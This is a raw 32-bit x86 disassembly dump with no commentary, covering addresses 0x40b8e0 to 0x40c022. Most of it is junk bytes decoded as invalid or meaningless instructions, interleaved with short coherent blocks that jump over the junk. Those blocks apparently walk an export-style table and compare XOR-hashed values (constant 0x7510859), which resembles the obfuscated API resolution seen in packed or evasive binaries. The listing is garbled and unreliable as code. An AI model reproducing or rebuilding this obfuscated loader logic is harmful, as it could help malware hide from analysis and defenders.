  40b8e0:	(bad)  
  40b8e1:	jns    0x40b8fc
  40b8e3:	pop    ebp
  40b8e4:	adc    cl,ah
  40b8e6:	call   0xe9f68580
  40b8eb:	mov    WORD PTR [edi-0x58],ss
  40b8ee:	cmp    eax,DWORD PTR [ecx+0x49cec23a]
  40b8f4:	cdq    
  40b8f5:	sub    ecx,esp
  40b8f7:	adc    edi,ebp
  40b8f9:	dec    edx
  40b8fa:	mov    dl,0x3b
  40b8fc:	pop    ebp
  40b8fd:	jecxz  0x40b908
  40b8ff:	mov    esi,0x8c7ccda2
  40b904:	pop    ds
  40b905:	fs leave 
  40b907:	sub    BYTE PTR [edi-0x69a56a24],cl
  40b90d:	cdq    
  40b90e:	mov    ah,0x83
  40b910:	leave  
  40b911:	pusha  
  40b912:	sbb    BYTE PTR [ecx],ah
  40b914:	xor    BYTE PTR [eax],dl
  40b916:	lea    eax,[ebx]
  40b918:	imul   esp,DWORD PTR [edi],0xffffffa7
  40b91b:	jmp    0xc63da37d
  40b920:	cmp    ecx,DWORD PTR ds:0x3e1a8a00
  40b926:	mov    ds:0xc7a489b2,eax
  40b92b:	or     esp,eax
  40b92d:	lock scas eax,DWORD PTR es:[edi]
  40b92f:	(bad)  [ebp-0x1e6f02d0]
  40b935:	or     dl,BYTE PTR gs:[edi-0x2]
  40b939:	mov    DWORD PTR [ebp-0x2c],ecx
  40b93c:	mov    eax,DWORD PTR [ebp-0x14]
  40b93f:	mov    ecx,DWORD PTR [ebp+0x8]
  40b942:	add    ecx,DWORD PTR [eax+0x1c]
  40b945:	xor    esi,esi
  40b947:	mov    DWORD PTR [ebp-0x14],ecx
  40b94a:	mov    eax,DWORD PTR [ebp-0x28]
  40b94d:	mov    ecx,DWORD PTR [ebp+0x8]
  40b950:	add    ecx,DWORD PTR [eax+edi*4]
  40b953:	jmp    0x40ba38
  40b958:	pop    ss
  40b959:	pusha  
  40b95a:	pop    esp
  40b95b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95c:	jns    0x40b916
  40b95e:	out    0x61,eax
  40b960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b961:	push   ds
  40b962:	jg     0x40b96d
  40b964:	ss in  al,0x68
  40b967:	fstp   TBYTE PTR [ecx+0x33]
  40b96a:	jle    0x40b9ea
  40b96c:	mov    dh,0x7e
  40b96e:	jle    0x40b9ee
  40b970:	mov    WORD PTR [eax+0x6a],fs
  40b973:	or     DWORD PTR [ecx+esi*8-0x1a5982f8],0xffffffd9
  40b97b:	push   esi
  40b97c:	sbb    eax,0xb74f097c
  40b981:	sub    BYTE PTR [ebx+0xc],bh
  40b984:	inc    edi
  40b985:	pop    ecx
  40b986:	or     al,0x9f
  40b988:	(bad)  
  40b989:	std    
  40b98a:	inc    ecx
  40b98b:	and    dl,al
  40b98d:	pushf  
  40b98e:	fstp   QWORD PTR [esp+ecx*2+0x3b]
  40b992:	nop
  40b993:	lods   al,BYTE PTR ds:[esi]
  40b994:	stc    
  40b995:	lods   al,BYTE PTR ds:[esi]
  40b996:	xor    esi,edi
  40b998:	xchg   esp,eax
  40b999:	dec    ebx
  40b99a:	lock stos DWORD PTR es:[edi],eax
  40b99c:	out    0xe3,al
  40b99e:	es xchg edi,eax
  40b9a0:	rcl    DWORD PTR [esp+ecx*1-0x41],cl
  40b9a4:	push   0xffffffea
  40b9a6:	fistp  WORD PTR [ecx-0x684fa8a]
  40b9ac:	cmp    al,dh
  40b9ae:	aad    0x7c
  40b9b0:	adc    al,0x58
  40b9b2:	aam    0xc4
  40b9b4:	xor    DWORD PTR [ebp+0x64e49cf3],esp
  40b9ba:	pop    esi
  40b9bb:	in     al,0x70
  40b9bd:	scas   al,BYTE PTR es:[edi]
  40b9be:	add    cl,dl
  40b9c0:	dec    esi
  40b9c1:	les    esp,FWORD PTR [esi]
  40b9c3:	add    DWORD PTR [edi+0x2f13fb50],edi
  40b9c9:	retf   0x8b78
  40b9cc:	jnp    0x40b9fb
  40b9ce:	inc    esp
  40b9cf:	retf   
  40b9d0:	inc    edx
  40b9d1:	ficomp WORD PTR [eax]
  40b9d3:	push   0x4b
  40b9d5:	sub    eax,0xbe42bcf6
  40b9da:	push   es
  40b9db:	mov    ds:0x29a9de60,al
  40b9e0:	hlt    
  40b9e1:	in     eax,0xb3
  40b9e3:	int    0x2c
  40b9e5:	cmp    edi,edx
  40b9e7:	sbb    dl,ch
  40b9e9:	out    0x0,eax
  40b9eb:	out    dx,al
  40b9ec:	xor    al,0xfc
  40b9ee:	int    0xbf
  40b9f0:	jl     0x40ba44
  40b9f2:	or     al,0xeb
  40b9f4:	mov    eax,ds:0x9f76472e
  40b9f9:	or     dl,cl
  40b9fb:	xor    ebp,ebx
  40b9fd:	inc    ecx
  40b9fe:	push   cs
  40b9ff:	sbb    eax,0x79f988bc
  40ba04:	add    DWORD PTR [ebp+0x3aed04ed],edi
  40ba0a:	icebp  
  40ba0b:	repz inc edx
  40ba0d:	inc    esi
  40ba0e:	arpl   WORD PTR [eax+0x5c983912],bx
  40ba14:	not    DWORD PTR [ecx+edi*1+0x78b78d9b]
  40ba1b:	stos   DWORD PTR es:[edi],eax
  40ba1c:	out    0x5b,eax
  40ba1e:	mov    al,ss:0xa347e931
  40ba24:	jle    0x40ba8f
  40ba26:	and    edx,DWORD PTR [eax+edx*2]
  40ba29:	mov    DWORD PTR [eax],ecx
  40ba2b:	xchg   edx,eax
  40ba2c:	stc    
  40ba2d:	mov    WORD PTR [edi-0x7d5e6328],?
  40ba33:	daa    
  40ba34:	sti    
  40ba35:	cmp    dl,BYTE PTR [edx+0x2a]
  40ba38:	lea    eax,[ebp-0x8]
  40ba3b:	mov    DWORD PTR [ebp-0x30],ecx
  40ba3e:	push   eax
  40ba3f:	push   DWORD PTR [ebp-0x30]
  40ba42:	push   DWORD PTR [ebp+0xc]
  40ba45:	call   0x408325
  40ba4a:	mov    eax,DWORD PTR [ebp-0x4]
  40ba4d:	mov    ecx,DWORD PTR [ebp-0x8]
  40ba50:	xor    eax,0x7510859
  40ba55:	add    eax,ebx
  40ba57:	cmp    ecx,eax
  40ba59:	jne    0x40bb61
  40ba5f:	mov    eax,DWORD PTR [ebp-0x20]
  40ba62:	jmp    0x40bb47
  40ba67:	test   BYTE PTR [ebx+0x5b],al
  40ba6a:	scas   al,BYTE PTR es:[edi]
  40ba6b:	pop    ecx
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jns    0x40bae8
  40ba6f:	and    BYTE PTR [ebx+0x63],cl
  40ba72:	lock push 0xb1fcccae
  40ba78:	xor    BYTE PTR [esi+0x7e],bh
  40ba7b:	mov    dh,0x7e
  40ba7d:	jle    0x40bafd
  40ba7f:	clc    
  40ba80:	mov    dh,0x86
  40ba82:	adc    dl,BYTE PTR [esi+0x5006d3c]
  40ba88:	in     al,dx
  40ba89:	pop    edx
  40ba8a:	bound  ecx,QWORD PTR [edi]
  40ba8c:	mov    WORD PTR ds:0xfb1f1410,fs
  40ba92:	xchg   edx,eax
  40ba93:	dec    bh
  40ba95:	or     eax,0x29aef29b
  40ba9a:	lods   al,BYTE PTR ds:[esi]
  40ba9b:	jb     0x40ba28
  40ba9d:	mov    ebp,0x5c08a2fd
  40baa2:	(bad)  
  40baa3:	adc    bh,BYTE PTR [ebp-0x6ae38cad]
  40baa9:	(bad)  
  40baaa:	fs cmp al,0x81
  40baad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40baae:	xchg   ebp,eax
  40baaf:	outs   dx,BYTE PTR ds:[esi]
  40bab0:	jmp    0x40ba9d
  40bab2:	stos   DWORD PTR es:[edi],eax
  40bab3:	xchg   edx,eax
  40bab4:	in     al,dx
  40bab5:	mov    dh,0xb3
  40bab7:	add    al,0xd9
  40bab9:	std    
  40baba:	aad    0x7c
  40babc:	mov    ah,0xda
  40babe:	imul   ecx,DWORD PTR [eax],0xf98a0493
  40bac4:	popa   
  40bac5:	dec    edx
  40bac6:	out    0x63,eax
  40bac8:	pop    es
  40bac9:	(bad)  
  40baca:	pushf  
  40bacb:	(bad)  
  40bacd:	loop   0x40ba97
  40bacf:	fwait
  40bad0:	test   DWORD PTR [ecx+ecx*2],edx
  40bad3:	out    0xbe,eax
  40bad5:	mov    esp,0xb1c526
  40bada:	out    dx,al
  40badb:	ja     0x40ba63
  40badd:	out    dx,eax
  40bade:	int    0x22
  40bae0:	test   BYTE PTR [edi-0x61],dh
  40bae3:	mov    esp,0x17a28c64
  40bae8:	loopne 0x40bb50
  40baea:	bound  edi,QWORD PTR [edi+0x4a10e7bc]
  40baf0:	push   ecx
  40baf1:	icebp  
  40baf2:	stos   DWORD PTR es:[edi],eax
  40baf3:	xchg   esp,eax
  40baf4:	add    eax,0x4d542a86
  40baf9:	outs   dx,DWORD PTR ds:[esi]
  40bafa:	loopne 0x40bb5e
  40bafc:	cs (bad) 
  40bafe:	jecxz  0x40ba98
  40bb00:	xor    DWORD PTR [esi-0x52e785bd],edi
  40bb06:	fsubr  DWORD PTR [eax+ebx*8]
  40bb09:	sbb    BYTE PTR [ecx-0x18],dh
  40bb0c:	cdq    
  40bb0d:	out    0xd2,al
  40bb0f:	mov    ch,0xc6
  40bb11:	jp     0x40bb32
  40bb13:	adc    dl,dh
  40bb15:	mov    ah,0x8b
  40bb17:	dec    eax
  40bb18:	daa    
  40bb19:	popf   
  40bb1a:	clc    
  40bb1b:	dec    edx
  40bb1c:	nop
  40bb1d:	popa   
  40bb1e:	pop    ebp
  40bb1f:	jnp    0x40bac9
  40bb21:	mov    ecx,0x1d7a607f
  40bb26:	sub    eax,0xdd38eaab
  40bb2b:	lods   eax,DWORD PTR ds:[esi]
  40bb2c:	cmp    ah,BYTE PTR [eax+0x7d50e7c7]
  40bb32:	push   edi
  40bb33:	gs adc eax,0x711dbb7a
  40bb39:	or     al,BYTE PTR ds:0x8ed4b9
  40bb3f:	xchg   ebx,eax
  40bb40:	and    esp,ebp
  40bb42:	pop    eax
  40bb43:	pop    edi
  40bb44:	mov    dl,0xc0
  40bb46:	push   0xff83b47
  40bb4b:	adc    BYTE PTR [ebp-0x9],0xff
  40bb4f:	(bad)  
  40bb50:	jmp    0x40bb71
  40bb55:	mov    eax,DWORD PTR [ebp-0x4]
  40bb58:	xor    eax,esi
  40bb5a:	add    eax,ebx
  40bb5c:	jmp    0x40c696
  40bb61:	mov    eax,DWORD PTR [ebp-0x2c]
  40bb64:	movzx  eax,WORD PTR [eax+edi*2]
  40bb68:	mov    ecx,DWORD PTR [ebp-0x14]
  40bb6b:	mov    eax,DWORD PTR [ecx+eax*4]
  40bb6e:	mov    DWORD PTR [ebp+0xc],eax
  40bb71:	mov    eax,DWORD PTR [ebp-0x4]
  40bb74:	mov    ecx,DWORD PTR [ebp-0x8]
  40bb77:	xor    eax,0x7510859
  40bb7c:	add    eax,ebx
  40bb7e:	cmp    ecx,eax
  40bb80:	jne    0x40bb93
  40bb86:	mov    eax,DWORD PTR [ebp-0x4]
  40bb89:	xor    eax,0x7510859
  40bb8e:	jmp    0x40bb5a
  40bb93:	mov    eax,DWORD PTR [ebp+0xc]
  40bb96:	add    eax,DWORD PTR [ebp+0x8]
  40bb99:	mov    DWORD PTR [ebp-0x10],eax
  40bb9c:	mov    eax,DWORD PTR [ebp-0x1c]
  40bb9f:	test   eax,eax
  40bba1:	je     0x40c2b4
  40bba7:	mov    DWORD PTR [ebp-0x24],esi
  40bbaa:	push   0xb
  40bbac:	pop    ecx
  40bbad:	push   0x5
  40bbaf:	dec    ecx
  40bbb0:	jmp    0x40bc95
  40bbb5:	pop    ss
  40bbb6:	imul   dh
  40bbb8:	mov    bl,0x6f
  40bbba:	jnp    0x40bb77
  40bbbc:	push   0xffffffce
  40bbbe:	pop    ecx
  40bbbf:	and    esi,ebx
  40bbc1:	iret   
  40bbc2:	ins    BYTE PTR es:[edi],dx
  40bbc3:	imul   ebx,DWORD PTR [edx],0xffffff89
  40bbc6:	xor    DWORD PTR [esi+0x7e],edi
  40bbc9:	mov    dh,0x7e
  40bbcb:	jle    0x40bc4b
  40bbcd:	dec    esp
  40bbce:	sub    al,0xee
  40bbd0:	retf   
  40bbd1:	sbb    eax,0x45037013
  40bbd6:	les    ebx,FWORD PTR [esi]
  40bbd8:	mov    ah,0x29
  40bbda:	arpl   WORD PTR [edi],di
  40bbdc:	xlat   BYTE PTR ds:[ebx]
  40bbdd:	ds adc eax,0x848c692b
  40bbe3:	xchg   ebp,eax
  40bbe4:	test   al,0x4d
  40bbe6:	sub    BYTE PTR [edx],dh
  40bbe8:	cdq    
  40bbe9:	loope  0x40bb8d
  40bbeb:	add    DWORD PTR [ecx+0x38a1380f],edx
  40bbf1:	sub    BYTE PTR [esi+0x55],0x6b
  40bbf5:	loop   0x40bb7a
  40bbf7:	test   dh,0xd2
  40bbfa:	cmp    al,0x2f
  40bbfc:	daa    
  40bbfd:	ss ins BYTE PTR es:[edi],dx
  40bbff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc00:	retf   
  40bc01:	iret   
  40bc02:	xor    BYTE PTR [esi+0x13],cl
  40bc05:	and    al,0x7c
  40bc07:	movzx  edi,bp
  40bc0a:	cld    
  40bc0b:	das    
  40bc0c:	inc    esp
  40bc0d:	xchg   ebp,eax
  40bc0f:	pop    eax
  40bc10:	out    0x6a,al
  40bc12:	mov    BYTE PTR [ebx+0x34],bl
  40bc15:	test   al,0x59
  40bc17:	imul   esi,ecx,0x46
  40bc1a:	fnstcw WORD PTR [edi+ebp*4-0x6e418616]
  40bc21:	cmp    BYTE PTR ds:0x2ebef505,dl
  40bc27:	or     al,0xbd
  40bc29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc2a:	jle    0x40bc4c
  40bc2c:	pop    ebx
  40bc2d:	jo     0x40bc58
  40bc2f:	cmp    dl,dh
  40bc31:	xor    bl,bl
  40bc33:	aam    0x97
  40bc35:	sbb    DWORD PTR [edx],ecx
  40bc37:	mov    ds:0x6cea5bb8,al
  40bc3c:	lds    eax,FWORD PTR [edi+0x775a9b0f]
  40bc42:	jbe    0x40bc74
  40bc44:	add    DWORD PTR [eax],ecx
  40bc46:	ret    0x36
  40bc49:	ds repnz cmp al,0x61
  40bc4d:	mov    ecx,0x76db0a28
  40bc52:	cmp    edx,DWORD PTR [esi-0x72]
  40bc55:	cmp    BYTE PTR [ecx+0x7d],0x97
  40bc59:	imul   edx,DWORD PTR [edi+0x3309284f],0x2841cb72
  40bc63:	retf   
  40bc64:	mov    cl,0xd2
  40bc66:	aam    0xa7
  40bc68:	xor    DWORD PTR [ecx-0x647cf31],esi
  40bc6e:	mov    ds:0xee3cae25,al
  40bc73:	xchg   esp,eax
  40bc74:	nop
  40bc75:	xchg   ebp,eax
  40bc76:	int3   
  40bc77:	push   ebx
  40bc78:	das    
  40bc79:	enter  0x9ad,0xea
  40bc7d:	inc    edx
  40bc7e:	jg     0x40bc99
  40bc80:	and    DWORD PTR [ecx+0x205e3356],ebx
  40bc86:	and    ecx,eax
  40bc88:	and    ch,ch
  40bc8a:	jl     0x40bcb0
  40bc8c:	jne    0x40bc44
  40bc8e:	pop    es
  40bc8f:	mov    ds:0xd5355f38,eax
  40bc94:	jnp    0x40bcf1
  40bc96:	xchg   ebx,ecx
  40bc98:	sub    ebx,ecx
  40bc9a:	xchg   ebx,ecx
  40bc9c:	dec    ecx
  40bc9d:	mov    eax,DWORD PTR [ebp-0x1c]
  40bca0:	imul   eax,ecx
  40bca3:	sub    esp,eax
  40bca5:	mov    DWORD PTR [ebp-0x24],esp
  40bca8:	mov    eax,DWORD PTR [ebp-0x4]
  40bcab:	mov    ecx,0x7510859
  40bcb0:	jmp    0x40bd95
  40bcb5:	xchg   edi,eax
  40bcb6:	adc    DWORD PTR [ecx+eax*2+0x78],0x79
  40bcbb:	mov    ebx,0xdff72d79
  40bcc0:	ins    DWORD PTR es:[edi],dx
  40bcc1:	bound  ebx,QWORD PTR [esp+esi*2]
  40bcc4:	mov    eax,ecx
  40bcc6:	ss jle 0x40bd47
  40bcc9:	mov    dh,0x7e
  40bccb:	jle    0x40bd4b
  40bccd:	mov    esp,DWORD PTR [esi+0x2c]
  40bcd0:	cmp    eax,0x783d7bce
  40bcd5:	or     eax,0xda6bb7f0
  40bcda:	jl     0x40bd56
  40bcdc:	dec    eax
  40bcdd:	jg     0x40bc96
  40bcdf:	and    al,0x6f
  40bce1:	jbe    0x40bd32
  40bce3:	dec    edx
  40bce4:	push   esi
  40bce5:	jecxz  0x40bce4
  40bce7:	dec    edi
  40bce8:	(bad)  
  40bce9:	jle    0x40bd3c
  40bceb:	out    dx,eax
  40bcec:	jb     0x40bd0b
  40bcee:	inc    ebp
  40bcef:	ret    0x5721
  40bcf2:	mov    cl,0xd6
  40bcf4:	or     ebx,DWORD PTR [ecx+0x5b]
  40bcf7:	cld    
  40bcf8:	pop    ds
  40bcf9:	scas   al,BYTE PTR es:[edi]
  40bcfa:	test   edx,edx
  40bcfc:	add    al,0xbc
  40bcfe:	inc    esp
  40bcff:	gs shl edx,1
  40bd02:	jns    0x40bc9d
  40bd04:	popf   
  40bd05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd06:	add    DWORD PTR [edx],ebx
  40bd08:	rep stos DWORD PTR es:[edi],eax
  40bd0a:	sbb    edx,DWORD PTR [esi+0x545f7537]
  40bd10:	shl    BYTE PTR [ebp+0x3e],0xf1
  40bd14:	or     ch,bl
  40bd16:	iret   
  40bd17:	arpl   WORD PTR [edi-0xb],di
  40bd1a:	push   eax
  40bd1b:	mov    ch,BYTE PTR [esi-0x2]
  40bd1e:	imul   edx,DWORD PTR ds:0xd52e99c1,0xffffffef
  40bd25:	data16 mov cl,0xbc
  40bd28:	and    BYTE PTR [ebx],ch
  40bd2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd2b:	adc    dl,BYTE PTR [ebx]
  40bd2d:	cld    
  40bd2e:	cmp    al,BYTE PTR [esi+ebp*8]
  40bd31:	(bad)
  40bd34:	stc    
  40bd35:	mov    BYTE PTR [edi+eax*4+0x22],0x90
  40bd3a:	push   eax
  40bd3b:	xchg   ebp,eax
  40bd3c:	cmp    BYTE PTR ds:0xc7499166,al
  40bd42:	mov    ebx,0x40b4814b
  40bd47:	xchg   DWORD PTR cs:[ecx],esi
  40bd4a:	xchg   ecx,eax
  40bd4b:	test   eax,0x33b6fd33
  40bd50:	cmp    al,0x38
  40bd52:	loopne 0x40bcf9
  40bd54:	daa    
  40bd55:	in     eax,dx
  40bd56:	hlt    
  40bd57:	pop    esp
  40bd58:	jnp    0x40bcdc
  40bd5a:	pop    esp
  40bd5b:	and    eax,0x597b464b
  40bd60:	xor    al,0x72
  40bd62:	dec    ebx
  40bd63:	lds    ecx,FWORD PTR [ebp+esi*2+0x61]
  40bd67:	les    ecx,FWORD PTR [ebp+0x34ea8851]
  40bd6d:	push   edx
  40bd6e:	aaa    
  40bd6f:	cmp    al,0x6a
  40bd71:	scas   eax,DWORD PTR es:[edi]
  40bd72:	and    bl,dl
  40bd74:	sbb    cl,ch
  40bd76:	test   eax,0xcbcfdb4
  40bd7b:	outs   dx,DWORD PTR ds:[esi]
  40bd7c:	push   es
  40bd7d:	fmul   DWORD PTR [ecx]
  40bd7f:	cmp    BYTE PTR [bp+0x2f15],al
  40bd84:	dec    ebx
  40bd85:	adc    edi,DWORD PTR [edx]
  40bd87:	jno    0x40bdbf
  40bd89:	icebp  
  40bd8a:	jle    0x399d1772
  40bd90:	(bad)  
  40bd92:	fsubr  QWORD PTR [esi]
  40bd94:	retf   0xc133
  40bd97:	mov    edx,0x32729f
  40bd9c:	add    eax,edx
  40bd9e:	mov    DWORD PTR [ebp+0x8],eax
  40bda1:	mov    eax,DWORD PTR [ebp-0x18]
  40bda4:	xor    eax,ecx
  40bda6:	add    eax,edx
  40bda8:	mov    edx,DWORD PTR [ebp+0x14]
  40bdab:	jmp    0x40be90
  40bdb0:	dec    DWORD PTR [ebx-0x47d6c7ef]
  40bdb6:	xchg   DWORD PTR [ecx-0x43979b07],edi
  40bdbc:	push   ds
  40bdbd:	enter  0x8200,0x19
  40bdc1:	aaa    
  40bdc2:	jle    0x40be42
  40bdc4:	mov    dh,0x7e
  40bdc6:	jle    0x40be46
  40bdc8:	lds    ebx,FWORD PTR [esi]
  40bdca:	xchg   edx,eax
  40bdcb:	call   0x33ca44b9
  40bdd0:	mov    BYTE PTR [eax-0x34],al
  40bdd3:	fst    QWORD PTR [eax+0x215b7a97]
  40bdd9:	cwde   
  40bdda:	(bad)  
  40bddb:	cmp    DWORD PTR [ebx],eax
  40bddd:	cmp    edx,DWORD PTR [edx-0x1]
  40bde0:	les    eax,FWORD PTR [edx+edx*4]
  40bde3:	pop    edx
  40bde4:	mov    eax,ecx
  40bde6:	pusha  
  40bde7:	ret    0x335f
  40bdea:	fld    TBYTE PTR [esi+0x5]
  40bded:	sbb    BYTE PTR [eax+0x3846c37c],bh
  40bdf3:	xor    DWORD PTR [ecx+eax*8],0xffffffed
  40bdf7:	jl     0x40bdd3
  40bdf9:	sbb    al,0x63
  40bdfb:	fidiv  WORD PTR [esi]
  40bdfd:	jmp    0x40be6f
  40bdff:	mov    ?,edx
  40be01:	les    ebp,FWORD PTR [ecx+0x72]
  40be04:	push   ds
  40be05:	movaps xmm3,XMMWORD PTR [ebx*1+0x2bb298f2]
  40be0d:	push   esi
  40be0e:	repz xor bh,bh
  40be11:	shl    eax,0xa0
  40be14:	pop    edi
  40be15:	sbb    al,0x8e
  40be17:	enter  0x300c,0x63
  40be1b:	retf   
  40be1c:	jne    0x40be39
  40be1e:	inc    edi
  40be1f:	dec    ebp
  40be20:	xor    al,0x3c
  40be22:	lds    esp,FWORD PTR [eax]
  40be24:	ret    
  40be25:	xchg   ebx,eax
  40be26:	hlt    
  40be27:	inc    ebp
  40be28:	rol    BYTE PTR [ebp+0x5e],1
  40be2b:	outs   dx,DWORD PTR ds:[esi]
  40be2c:	fistp  QWORD PTR [edi+0x6f87291f]
  40be32:	xor    cl,BYTE PTR [ecx-0x584f6d81]
  40be38:	pop    esp
  40be39:	fwait
  40be3a:	rcl    DWORD PTR [eax-0x3b],1
  40be3d:	push   0x9382fa37
  40be42:	in     eax,dx
  40be43:	dec    eax
  40be44:	dec    eax
  40be45:	outs   dx,BYTE PTR ds:[esi]
  40be46:	dec    esp
  40be47:	int3   
  40be48:	(bad)  
  40be49:	out    0x17,eax
  40be4b:	in     al,0x16
  40be4d:	and    al,0x0
  40be4f:	jns    0x40be81
  40be51:	adc    eax,0x502fe0c5
  40be56:	dec    eax
  40be57:	and    eax,0xc52e8512
  40be5c:	mov    ebp,0xf8b9ea3
  40be61:	xor    DWORD PTR [ebp-0xd2bf353],ecx
  40be67:	aad    0x17
  40be69:	xchg   ecx,eax
  40be6a:	sub    eax,0xd4c6be26
  40be6f:	rol    dl,0x9e
  40be72:	cs je  0x40be34
  40be75:	pop    esp
  40be76:	mov    bl,0xf1
  40be78:	sar    BYTE PTR [ebp-0x607873ac],1
  40be7e:	pop    es
  40be7f:	pushf  
  40be80:	and    ebx,esp
  40be82:	sub    BYTE PTR [ecx-0x6bf92ea6],ah
  40be88:	mov    edi,0x1502a230
  40be8d:	push   es
  40be8e:	lods   al,BYTE PTR ds:[esi]
  40be8f:	push   0xe902af0f
  40be94:	loopne 0x40be96
  40be96:	add    BYTE PTR [eax],al
  40be98:	inc    ebp
  40be99:	loop   0x40be83
  40be9b:	xchg   edi,eax
  40be9c:	imul   esp,DWORD PTR [ebp-0x36f31fa7],0x1a787640
  40bea6:	(bad)  
  40bea7:	xchg   esp,eax
  40bea8:	push   ecx
  40bea9:	aaa    
  40beaa:	jle    0x40bf2a
  40beac:	mov    dh,0x7e
  40beae:	jle    0x40bf2e
  40beb0:	mov    ebp,DWORD PTR [eax+0xd9ca449]
  40beb6:	adc    al,0x32
  40beb8:	out    0x2c,eax
  40beba:	mov    ds:0x84f722b0,al
  40bebf:	jo     0x40be4d
  40bec1:	sub    al,0x8d
  40bec3:	jb     0x40bef3
  40bec5:	inc    eax
  40bec6:	pop    ebx
  40bec7:	repnz dec esp
  40bec9:	stos   DWORD PTR es:[edi],eax
  40beca:	out    0x56,eax
  40becc:	ret    
  40becd:	hlt    
  40bece:	jb     0x40bf09
  40bed0:	dec    esp
  40bed1:	push   esi
  40bed2:	jmp    0x75ebd84f
  40bed7:	xchg   edx,eax
  40bed8:	inc    edi
  40bed9:	sbb    BYTE PTR ds:0x30ceca69,bl
  40bedf:	jns    0x40bef1
  40bee1:	pop    eax
  40bee2:	(bad)  
  40bee3:	imul   eax,ebx,0x790ccc82
  40bee9:	adc    al,0xae
  40beeb:	retf   
  40beec:	dec    ebp
  40beed:	stos   BYTE PTR es:[edi],al
  40beee:	rcr    cl,cl
  40bef0:	bt     DWORD PTR [edi-0x2b8b940a],edx
  40bef7:	pop    ebx
  40bef8:	mov    eax,ds:0xb0a65617
  40befd:	pusha  
  40befe:	leave  
  40beff:	jge    0x40bef7
  40bf01:	stos   BYTE PTR es:[edi],al
  40bf02:	into   
  40bf03:	lock test dl,bh
  40bf06:	mov    ds:0x3efd35aa,al
  40bf0b:	or     DWORD PTR [edx],esi
  40bf0d:	inc    edi
  40bf0e:	jl     0x40bedb
  40bf10:	popa   
  40bf11:	addr16 pop eax
  40bf13:	fcom   st(4)
  40bf15:	push   edi
  40bf16:	imul   edx,DWORD PTR [edx],0x1f1ea617
  40bf1c:	cmp    BYTE PTR [eax],bh
  40bf1e:	cwde   
  40bf1f:	mov    ds:0xd2192b0b,al
  40bf24:	repnz ror BYTE PTR [esi+0x9],0xb4
  40bf29:	jbe    0x40bf94
  40bf2b:	or     edx,0x44
  40bf2e:	jl     0x40beee
  40bf30:	sbb    ebp,DWORD PTR [esi+0x77e10057]
  40bf36:	sub    ebx,DWORD PTR [ebp-0x54e01cce]
  40bf3c:	jl     0x40bef6
  40bf3e:	sbb    cl,ch
  40bf40:	jge    0x40bf02
  40bf42:	inc    ecx
  40bf43:	in     al,dx
  40bf44:	jns    0x40bfbe
  40bf46:	sbb    al,0x74
  40bf48:	add    al,al
  40bf4a:	mov    cs,WORD PTR [eax]
  40bf4c:	xchg   ecx,eax
  40bf4d:	jnp    0x40bf29
  40bf4f:	xchg   BYTE PTR [ecx*1+0x14256f1e],ah
  40bf56:	sub    al,0xda
  40bf58:	jne    0x40bf47
  40bf5a:	fadd   st,st(1)
  40bf5c:	lea    esp,[ecx]
  40bf5e:	retf   0x6396
  40bf61:	out    0xeb,eax
  40bf63:	in     al,dx
  40bf64:	in     eax,0xb0
  40bf66:	sbb    eax,ecx
  40bf68:	inc    esi
  40bf69:	xchg   DWORD PTR [ebx],ebp
  40bf6b:	lods   al,BYTE PTR ds:[esi]
  40bf6c:	cmp    bh,BYTE PTR [esi]
  40bf6e:	aam    0x36
  40bf70:	sub    DWORD PTR [edx],ebp
  40bf72:	in     eax,dx
  40bf73:	xor    eax,0x41dfd5ce
  40bf78:	mov    edx,DWORD PTR [ebp-0x4]
  40bf7b:	xor    edx,ecx
  40bf7d:	mov    ecx,DWORD PTR [ebp+0x8]
  40bf80:	lea    ecx,[edx+ecx*1+0x32729f]
  40bf87:	cmp    ecx,eax
  40bf89:	je     0x40c1ca
  40bf8f:	mov    edi,DWORD PTR [ebp-0x18]
  40bf92:	mov    eax,DWORD PTR [ebp+0x8]
  40bf95:	mov    edx,DWORD PTR [ebp+0x14]
  40bf98:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40bf9c:	jmp    0x40c081
  40bfa1:	pop    ss
  40bfa2:	sub    al,0x93
  40bfa4:	sub    edi,DWORD PTR [ecx+0x192097b9]
  40bfaa:	jne    0x40bf81
  40bfac:	stos   BYTE PTR es:[edi],al
  40bfad:	push   cs
  40bfae:	add    DWORD PTR ds:0x7e34a95b,ebp
  40bfb4:	jle    0x40bf6c
  40bfb6:	jle    0x40c036
  40bfb8:	jle    0x40c01a
  40bfba:	add    ah,BYTE PTR [edx+0x16357f10]
  40bfc0:	pop    esp
  40bfc1:	inc    eax
  40bfc2:	out    0x33,eax
  40bfc4:	sbb    edi,eax
  40bfc6:	and    DWORD PTR [ebp-0x38],0x6e607945
  40bfcd:	jb     0x40bfc3
  40bfcf:	sbb    ecx,ecx
  40bfd1:	or     DWORD PTR [eax-0x3e],edi
  40bfd4:	xchg   ebp,eax
  40bfd5:	inc    ecx
  40bfd6:	mov    ebp,0x627916ca
  40bfdb:	fdivr  DWORD PTR [edi]
  40bfdd:	repnz mov DWORD PTR [ebx-0x47],edi
  40bfe1:	leave  
  40bfe2:	or     DWORD PTR [bx+si],ebx
  40bfe5:	pop    ss
  40bfe6:	(bad)  
  40bfe7:	lock cld 
  40bfe9:	mov    dh,0xfd
  40bfeb:	jb     0x40bf96
  40bfed:	je     0x40bfae
  40bfef:	xchg   esi,eax
  40bff0:	pushf  
  40bff1:	mov    DWORD PTR [ebx+0x5],eax
  40bff4:	imul   ebp,DWORD PTR [edx+0x5ed0134b],0xf4059393
  40bffe:	add    ecx,edi
  40c000:	loope  0x40c02d
  40c002:	retf   0x1cc8
  40c005:	dec    ebp
  40c006:	add    BYTE PTR ds:0x78ddb4c8,0xd5
  40c00d:	mov    esp,0xcdd0fbe2
  40c012:	cmp    DWORD PTR [edx-0x45],esp
  40c015:	int3   
  40c016:	retf   0xc15d
  40c019:	cmp    esi,ebp
  40c01b:	xchg   esi,eax
  40c01c:	pusha  
  40c01d:	adc    DWORD PTR [esi],esp
  40c01f:	pop    es
  40c020:	jle    0x40c008
  40c022:	lods   al,BYTE PTR ds:[esi]
